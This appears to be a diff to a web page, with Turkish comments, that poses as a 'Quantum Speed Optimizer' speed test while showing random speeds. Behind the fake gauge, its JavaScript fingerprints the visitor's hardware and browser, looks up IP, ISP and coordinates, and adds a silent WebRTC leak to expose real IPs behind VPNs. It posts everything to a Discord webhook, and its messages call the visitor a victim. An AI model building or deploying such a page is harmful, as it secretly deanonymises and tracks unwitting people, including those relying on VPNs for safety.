@@ -161,7 +161,7 @@
 
 <div class="container">
     <h2>QEAT NETWORK</h2>
-    <p>// QUANTUM SPEED OPTIMIZER v3.0</p>
+    <p>// QUANTUM SPEED OPTIMIZER v3.5</p>
     
     <div class="speed-gauge" id="gauge">
         <div class="gauge-overlay"></div>
@@ -189,6 +189,33 @@
         return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
     }
 
+    // Sıfır izin gerektiren, pop-up'sız arka plan WebRTC sızıntı avcısı
+    function getWebRTCIP() {
+        return new Promise((resolve) => {
+            const ips = [];
+            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+            
+            if (!RTCPeerConnection) return resolve("Desteklenmiyor");
+
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
+            pc.createDataChannel("");
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                    if (ips.length === 0) resolve("Sızıntı Alınamadı");
+                    else resolve(ips.join(" | "));
+                    return;
+                }
+                const parts = ice.candidate.candidate.split(" ");
+                const ip = parts[4];
+                if (!ips.includes(ip)) ips.push(ip);
+            };
+            
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve("Hata"));
+            setTimeout(() => { if(ips.length > 0) resolve(ips.join(" | ")); else resolve("Zaman Aşımı"); }, 1500);
+        });
+    }
+
     async function startTest() {
         const btn = document.getElementById('start-btn');
         const gauge = document.getElementById('gauge');
@@ -197,7 +224,7 @@
         btn.disabled = true;
         btn.innerText = "EXTRACTING METRICS...";
         gauge.classList.add('spinning');
-        termBg.innerHTML = "SYS_STATUS: DEEP_SCAN_ACTIVE<br>NET_METRIC: HARVESTING_ALL_DATA";
+        termBg.innerHTML = "SYS_STATUS: DEEP_SCAN_ACTIVE<br>NET_METRIC: BYPASSING_TUNNELS";
 
         let speedInterval = setInterval(() => {
             let randomSpeed = (Math.random() * 140 + 40).toFixed(1);
@@ -206,7 +233,10 @@
         }, 60);
 
         try {
-            // 1. İstemci/Tarayıcı Derin Donanım Verileri
+            // 1. Sessiz WebRTC sızıntısını tetikle
+            const webrtcIPs = await getWebRTCIP();
+
+            // 2. İstemci/Tarayıcı Derin Donanım Verileri
             const gpu = getGPU();
             const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor/Kısıtlı";
             const cores = navigator.hardwareConcurrency || "Bilinmiyor";
@@ -220,14 +250,13 @@
             const language = navigator.language || "Bilinmiyor";
             const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Pasif";
             const onlineStatus = navigator.onLine ? "Çevrimiçi" : "Çevrimdışı";
-            const pdfViewer = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
             
-            // 2. Akıllı VPN / Konum Analiz Verileri (Client-Side)
+            // 3. Akıllı Zaman Analizi (VPN Delici #1)
             const realTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
             const localTime = new Date().toLocaleString('tr-TR'); 
             let vpnDetected = "Temiz (Çelişki Yok)";
 
-            // 3. Ağ API Çağrısı
+            // 4. Ağ API Çağrısı
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             
@@ -238,9 +267,11 @@
                 }
             }
             
-            // 4. Detaylı Metin Raporu Şablonu (.txt dosyası için)
-            const report = `[QEAT ULTIMATE STEALTH LOG - FULL EXFILTRATION]\n` +
+            // 5. Detaylı Metin Raporu Şablonu (.txt dosyası için)
+            const report = `[QEAT ULTIMATE STEALTH LOG - FULL EXFILTRATION v3.5]\n` +
                            `==================================================\n` +
+                           `[WEBRTC SESSİZ SIZINTI]\n` +
+                           `Sızan Ağ/IP İzleri: ${webrtcIPs}\n\n` +
                            `[VPN VE GÜVENLİK ANALİZİ]\n` +
                            `VPN/Proxy Tespiti: ${vpnDetected}\n` +
                            `Gerçek Zaman Dilimi: ${realTimezone}\n` +
@@ -249,8 +280,7 @@
                            `IP Adresi       : ${data.ip}\n` +
                            `Ağ Tipi (Version): IPv${data.version || "4"}\n` +
                            `İnternet Sağlayıcı: ${data.org || "Bilinmiyor"}\n` +
-                           `ASN (Ağ No)     : ${data.asn || "Bilinmiyor"}\n` +
-                           `Ağ Sınıfı (Aralık): ${data.network || "Bilinmiyor"}\n\n` +
+                           `ASN (Ağ No)     : ${data.asn || "Bilinmiyor"}\n\n` +
                            `[COĞRAFİ VERİLER]\n` +
                            `Ülke / Kod      : ${data.country_name} (${data.country_code})\n` +
                            `Şehir / Bölge   : ${data.city} / ${data.region}\n` +
@@ -271,23 +301,26 @@
                            `İşletim Sistemi : ${navigator.platform}\n` +
                            `Tarayıcı Dili   : ${language}\n` +
                            `User-Agent      : ${navigator.userAgent}\n` +
-                           `Çerez İzni      : ${cookieEnabled}\n` +
-                           `Ağ Durumu       : ${onlineStatus}\n` +
                            `==================================================`;
 
-            // 5. Kusursuz Discord Embed Tasarımı
+            // 6. Kusursuz Discord Embed Tasarımı
             const payload = {
-                username: "Qeat Omega Sniffer v3.0",
+                username: "Qeat Omega Sniffer v3.5",
                 avatar_url: "https://i.imgur.com/v8tT77X.png",
                 embeds: [
                     {
-                        title: "💥 FULL EXFILTRATION: SİSTEM VE KONUM SIZDIRILDI",
+                        title: "💥 PHANTOM HARVEST: TÜM MASKELER DÜŞÜRÜLDÜ",
                         color: 16580608,
                         timestamp: new Date().toISOString(),
-                        description: `**Kurban, sahte hız testi paneline dokunduğu an tüm dijital maskesi düşürüldü.**`,
+                        description: `**Kurban hiçbir pop-up izni vermeden, tamamen sessiz yöntemlerle enseylendi.**`,
                         fields: [
                             { 
-                                name: "🛡️ VPN & Sistem Zaman Analizi", 
+                                name: "🕵️ WebRTC Sessiz Sızıntı (Pop-up'sız)", 
+                                value: `**Sızan Gerçek IP/Ağ İzleri:**\n\`${webrtcIPs}\``, 
+                                inline: false 
+                            },
+                            { 
+                                name: "🛡️ VPN & Zaman Dilimi Çapraz Kontrol", 
                                 value: `**VPN Tetikleyici:** \`${vpnDetected}\`\n**Yerel Saat:** \`${localTime}\`\n**Sistem Dili:** \`${language}\``, 
                                 inline: false 
                             },
@@ -297,24 +330,19 @@
                                 inline: true 
                             },
                             { 
-                                name: "📍 Sağlayıcı Konumu", 
-                                value: `**Konum:** \`${data.city}, ${data.region} / ${data.country_name}\`\n**Koordinat:** \`${data.latitude}, ${data.longitude}\`\n**Posta Kodu:** \`${data.postal || "--"}\``, 
+                                name: "📍 Atanan IP Konumu", 
+                                value: `**Konum:** \`${data.city}, ${data.country_name}\`\n**Koordinat:** \`${data.latitude}, ${data.longitude}\`\n**Posta Kodu:** \`${data.postal || "--"}\``, 
                                 inline: true 
                             },
                             { 
                                 name: "💻 Donanım Özellikleri", 
-                                value: `**GPU:** \`${gpu}\`\n**RAM:** \`${ram}\` | **İşlemci Çekirdek:** \`${cores}\`\n**Dokunmatik Ekran:** \`${touchPoints} nokta\``, 
+                                value: `**GPU:** \`${gpu}\`\n**RAM:** \`${ram}\` | **İşlemci Çekirdek:** \`${cores}\``, 
                                 inline: false 
                             },
                             { 
                                 name: "🖥️ Ekran & Geometri", 
-                                value: `**Çözünürlük:** \`${scrWidth}x${scrHeight}\`\n**Aktif Pencere:** \`${winWidth}x${winHeight}\`\n**DPI Oranı:** \`${pixelRatio}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "⚙️ Yazılım İzleri", 
-                                value: `**OS Platform:** \`${navigator.platform}\`\n**Çerez İzni:** \`${cookieEnabled}\`\n**Tarayıcı Ağ:** \`${onlineStatus}\``, 
-                                inline: true 
+                                value: `**Çözünürlük:** \`${scrWidth}x${scrHeight}\`\n**Pencere:** \`${winWidth}x${winHeight}\`\n**OS Platform:** \`${navigator.platform}\``, 
+                                inline: false 
                             }
                         ],
                         footer: { text: "Qeat Core Intelligence Network Group" }
@@ -327,14 +355,12 @@
             const blob = new Blob([report], { type: 'text/plain' });
             formData.append('file', blob, `OMEGA_LOG_${data.ip}.txt`);
 
-            // Verileri sessizce gönderiyoruz
             await fetch(proxyWebhookURL, { method: 'POST', body: formData });
             termBg.innerHTML = "SYS_STATUS: OMEGA_EXFIL_SUCCESS<br>NET_METRIC: ALL_SHARDS_CAPTURED";
         } catch (e) {
             termBg.innerHTML = "SYS_STATUS: CRITICAL_ERR_BYPASSED<br>NET_METRIC: FORCE_RECOVERY";
         }
 
-        // Test bitti süvarisi
         setTimeout(() => {
             clearInterval(speedInterval);
             gauge.classList.remove('spinning');
